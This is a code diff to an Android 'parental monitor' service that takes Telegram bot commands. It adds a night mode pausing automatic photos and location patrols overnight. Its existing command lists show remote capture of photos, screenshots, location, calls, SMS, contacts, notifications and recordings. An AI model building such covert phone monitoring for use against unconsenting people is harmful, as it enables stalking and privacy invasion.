@@ -137,10 +137,10 @@ class MonitoringService : Service() {
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
-        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
+        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/night")
         private val NO_REPLAY_COMMANDS = setOf("/sms", "/smsconfirm", "/ring", "/record", "/recordvideo", "/lock")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms")
-        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start")
+        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val PING_RATE_WINDOW_MS = 120_000L
@@ -601,7 +601,7 @@ class MonitoringService : Service() {
                     cameraBeatAt = android.os.SystemClock.elapsedRealtime()
                     val minutes = cachedCameraInterval.coerceIn(0, 60)
                     val paused = System.currentTimeMillis() < cachedPhotoPausedUntil
-                    if (!cachedMonitoringPaused && !paused && minutes > 0) {
+                    if (!cachedMonitoringPaused && !paused && !isNightPaused() && minutes > 0) {
                         if (idleDataCycles >= 3 && !isScreenOn()) {
                             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Camera idle-skip (quiet device, screen off)")
                         } else {
@@ -645,7 +645,7 @@ class MonitoringService : Service() {
                 try {
                     val minutes = cachedPatrolInterval.coerceIn(5, 180)
                     val photoPaused = System.currentTimeMillis() < cachedPhotoPausedUntil
-                    if (!cachedMonitoringPaused && !photoPaused && cachedPatrolEnabled) {
+                    if (!cachedMonitoringPaused && !photoPaused && !isNightPaused() && cachedPatrolEnabled) {
                         patrolRound()
                         chunkedDelay(minutes * 60_000L)
                     } else if (cachedMonitoringPaused) {
@@ -1246,6 +1246,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
             com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
             com.redeye.parentalmonitor.network.BotCommand("perms", "Show app permissions"),
+            com.redeye.parentalmonitor.network.BotCommand("night", "Night mode: /night on|off"),
             com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
             com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
@@ -1427,6 +1428,7 @@ class MonitoringService : Service() {
                         appendLine("Photos: $photoState")
                         appendLine("Patrol: ${if (preferencesManager.patrolEnabled) "ON every ${preferencesManager.patrolInterval} min" else "off"}")
                         appendLine("Camera: ${preferencesManager.cameraFacing}")
+                        appendLine("Night: " + if (preferencesManager.nightMode) "ON 23–05" + if (isNightPaused()) " (quiet now)" else "" else "off")
                         appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                         appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                         appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
@@ -1490,6 +1492,26 @@ class MonitoringService : Service() {
                 } else {
                     preferencesManager.patrolInterval = minutes
                     sendToTelegram("\uD83D\uDEF0 Patrol interval set to $minutes min.")
+                }
+            }
+            "/night" -> {
+                when (arg.lowercase(java.util.Locale.ROOT)) {
+                    "on" -> {
+                        preferencesManager.nightMode = true
+                        try { restartCameraLoop() } catch (_: Exception) { }
+                        try { restartPatrolLoop() } catch (_: Exception) { }
+                        sendToTelegram("🌙 Night mode ON — auto photos/location pause 23:00–05:00.")
+                    }
+                    "off" -> {
+                        preferencesManager.nightMode = false
+                        try { restartCameraLoop() } catch (_: Exception) { }
+                        try { restartPatrolLoop() } catch (_: Exception) { }
+                        sendToTelegram("🌙 Night mode OFF.")
+                    }
+                    else -> {
+                        val state = if (preferencesManager.nightMode) "ON 23:00–05:00" else "OFF"
+                        sendToTelegram("Usage: /night \u003con|off\u003e (now $state)")
+                    }
                 }
             }
             "/pause" -> {
@@ -1997,6 +2019,7 @@ class MonitoringService : Service() {
                         appendLine("/photointerval \u003c0-60\u003e - set photo interval (0 = manual)")
                         appendLine("/patrol \u003con|off\u003e - auto photo + location patrol")
                         appendLine("/patrolinterval \u003c5-180\u003e - set patrol interval")
+                        appendLine("/night \u003con|off\u003e - quiet 23:00-05:00")
                         appendLine("/pause \u003cminutes\u003e - pause photos")
                         appendLine("/battery - show battery level")
                         appendLine("/status - show monitoring status")
@@ -3134,6 +3157,25 @@ class MonitoringService : Service() {
             (getSystemService(POWER_SERVICE) as android.os.PowerManager).isInteractive
         } catch (_: Exception) {
             true
+        }
+    }
+
+    private fun isNightTime(): Boolean {
+        return try {
+            val now = System.currentTimeMillis()
+            val off = java.util.TimeZone.getDefault().getOffset(now)
+            val h = (((now + off) / 3_600_000L) % 24L).toInt()
+            h >= 23 || h < 5
+        } catch (_: Exception) {
+            false
+        }
+    }
+
+    private fun isNightPaused(): Boolean {
+        return try {
+            preferencesManager.nightMode && isNightTime()
+        } catch (_: Exception) {
+            false
         }
     }
 
